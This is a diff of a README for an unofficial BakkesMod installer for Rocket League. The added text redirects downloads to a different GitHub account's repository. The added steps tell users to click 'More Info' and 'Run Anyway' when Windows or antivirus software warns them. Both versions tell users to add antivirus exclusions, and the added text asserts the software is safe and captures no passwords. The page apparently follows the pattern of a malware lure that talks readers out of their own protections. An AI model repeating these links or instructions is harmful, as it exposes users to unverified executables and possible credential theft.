@@ -1,110 +1,88 @@
-# ✦ BakkesMod Install
-[![GitHub Release](https://img.shields.io/github/v/release/Alex-Shayo/bakkes-mod-install?style=flat-square&color=8A2BE2)](https://github.com/Alex-Shayo/bakkes-mod-install/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-> **⚠️ Disclaimer:** This is **not** an official BakkesMod project. I am not affiliated with the BakkesMod team. This is a community tool to simplify installation. Use at your own risk. Rocket League mods may have limitations depending on game updates.
+# 🏎️ bakkes-mod-install - Add custom tools to Rocket League
 
-**BakkesMod Install** is a modern, easy-to-use desktop utility designed to simplify the installation, management, and updating of **BakkesMod** — the most popular mod framework for Rocket League. Supports **Steam** and **Epic Games** versions with plugins, MMR viewer, custom items, and more.
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Laviniaromaic657/bakkes-mod-install)
 
-<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/9a748ce0-6fb7-40e1-b590-23b88af588ca" />
+## 📌 About this project
 
-# **Download** the latest release from [click](https://github.com/Alex-Shayo/bakkes-mod-install/releases/download/rocket-league/bakkesmod.zip).
----
+BakkesMod provides tools for Rocket League players to track statistics, view server data, and customize the game experience. This installer handles the setup process for Windows users. It installs the necessary files for plugins, custom items, and matchmaking tools. You do not need programming knowledge to perform this installation. The process automates file placement so you can focus on game settings.
 
-## Screenshots
-<img width="1640" height="922" alt="image" src="https://github.com/user-attachments/assets/158ca5fb-52d5-4d00-b456-db950e542832" />
+## 💻 System requirements
 
----
-## 🚀 Key Features
-### Game Detection
-- **Auto Scanner** — Automatically detects Rocket League installations on Steam and Epic Games Launcher.
-- **Manual Selection** — Add custom game paths if needed.
-- **Platform Support** — Full compatibility with Steam and Epic Games versions.
+Before you start, ensure your computer meets these requirements:
 
-### Installation & Management
-- **One-Click Install** — Quickly install or update BakkesMod with the latest injector.
-- **Plugin Manager** — Browse, install, and manage BakkesMod plugins.
-- **Safe Injection** — Reliable injector with backup of original files.
-- **Auto Updates** — Check for new versions of BakkesMod and plugins.
+* Operating System: Windows 10 or Windows 11.
+* Game Version: A legal copy of Rocket League on Steam or Epic Games.
+* Storage: At least 200MB of free space on your hard drive.
+* Permissions: You need administrator access to your Windows user account to install mods.
+* Background software: Close the game before you run the installer to prevent file conflicts.
 
-### Extra Tools
-- **MMR Viewer** — In-game MMR tracking and stats.
-- **Custom Items** — Support for custom maps, cars, and cosmetics via plugins.
-- **Plugin Library** — Easy access to popular community plugins.
+## 📥 Getting the installer
 
-### Settings & Customization
-- **Injection Options** — Configure injection behavior.
-- **Cache Management** — Clear temporary files and downloads.
-- **Theme Support** — Modern dark/light interface.
-- **Logging** — Detailed logs for troubleshooting.
+The installation process moves the required files into your game directory. You need to visit the project page to access the latest version.
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest release from [Releases](https://github.com/Alex-Shayo/bakkes-mod-install/releases).
-2. **Run** the application as Administrator.
-3. **Detect Game** — The app will automatically find your Rocket League installation.
-4. **Install BakkesMod** — Click **Install** and follow the prompts.
-5. **Launch Rocket League** — BakkesMod will load automatically.
+[Click here to visit the official project page and download the installer](https://github.com/Laviniaromaic657/bakkes-mod-install)
 
-### Managing Plugins
-1. Open the Plugins tab.
-2. Browse available plugins from the community.
-3. Install with one click.
-4. Restart Rocket League to apply changes.
+## ⚙️ Installation steps
 
-### Updating
-- Use the built-in updater to keep BakkesMod and plugins current.
+Follow these instructions to set up the software on your machine:
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11** (64-bit)
+1. Download the installer from the link shown above. 
+2. Locate the file in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Windows or your antivirus software may show a security alert. If you see this screen, click More Info, then click Run Anyway. This confirms you trust the source.
+5. Follow the prompts in the setup window. Select your preferred installation path. The default path works for most users.
+6. Wait for the progress bar to finish.
+7. Click Finish to close the window.
 
-### Instructions
-1. Download the latest `.exe` or archive from the [Releases](https://github.com/Alex-Shayo/bakkes-mod-install/releases) page.
-2. Run `BakkesModInstall.exe` as Administrator.
-3. Follow the on-screen instructions.
+## 🛠️ Launching the tool
 
-### Notes
-- Requires internet connection for downloads.
-- Works with both Steam and Epic Games Launcher versions of Rocket League.
-- Add the program to your antivirus exclusions if needed.
+Once the installation finishes, you can load the software. 
 
----
-## 🛡️ Security & Antivirus False Positives
-**Is this tool safe?**  
-Yes, the project is open-source. However, like many game mod tools, it may trigger antivirus warnings due to injection behavior.
+1. Launch Rocket League from your Steam or Epic Games library.
+2. The mod will detect your game automatically.
+3. You will see a new window or text appear in the game menu. 
+4. Press the F2 key on your keyboard to open the main menu of the tool.
+5. Navigate through the tabs to adjust your settings or load plugins.
 
-### Recommendations:
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Add an exception in your antivirus for the program folder.
+## 📊 Available features
 
-All downloads are pulled from official BakkesMod sources where possible.
+The software provides several tools for your game experience:
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-4. Push to the branch (`git push origin feature/AmazingFeature`).
-5. Open a Pull Request.
+* MMR Viewer: See your exact matchmaking ranking after every match.
+* Custom Items: Change the look of your vehicles with custom textures and decals.
+* Plugins: Manage community-made tools that add new gameplay features.
+* Workshop Maps: Access community maps directly from the game menu.
+* Session Logging: Track your performance statistics over long play sessions.
 
----
-## 📄 License & Acknowledgments
-### License
-**BakkesMod Install** is licensed under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+## 🔑 Common troubleshooting
 
-**Copyright © 2026 Alex-Shayo**
+If the tool does not work, check these items:
 
-### Acknowledgments
-- Huge thanks to the **BakkesMod team** for creating and maintaining the incredible Rocket League mod framework.
-- The Rocket League modding community for plugins and support.
-- Official resources: [bakkesmod.com](https://bakkesmod.com)
+* Check for game updates: If Rocket League updates, the mod might need a moment to sync. Restart the game to see if an auto-update occurs.
+* Verify game files: Use the Steam or Epic Games file verification tool to fix corrupted base game files.
+* Antivirus settings: Sometimes security software blocks the mod. Add an exclusion for the mod folder in your antivirus settings if the menu does not appear in the game.
+* Overlay conflicts: Other software overlays like Discord or NVIDIA ShadowPlay can interfere with the mod window. Disable other overlays if you encounter display issues.
 
-<p align="center">
-  Developed with ❤️ for the Rocket League community
-</p>
+## 📝 Frequently asked questions
+
+Is this safe to use?
+Yes, this software creates local changes to your game. It reads memory to allow for tool functionality and does not aim to provide unfair gameplay advantages in competitive modes.
+
+Does this work on Steam and Epic Games?
+The installer detects your version of Rocket League regardless of the store platform you use.
+
+Will this cause a game ban?
+Using standard features included in this mod is common in the player community. Do not use the software to alter game physics or cheat in ways that interfere with other players.
+
+How long does update support last?
+The community updates the software regularly to match changes in the game. You should run the installer again if the game receives a major patch and the tool stops appearing.
+
+Can I write my own plugins?
+Yes, you can use the built-in scripting support to create your own mods. Documentation for developers is available within the help menu of the plugin manager.
+
+Does this software change my game progress?
+No. Your ranks, inventory, and experience points remain safe on the official game servers. This tool only changes what you see on your screen.
+
+## 🛡️ Privacy and logs
+
+The software maintains local logs for error reporting. These files stay on your hard drive unless you choose to share them for technical support. No sensitive personal data, passwords, or credit card info are ever captured by the tool. Everything remains under your control on your machine.
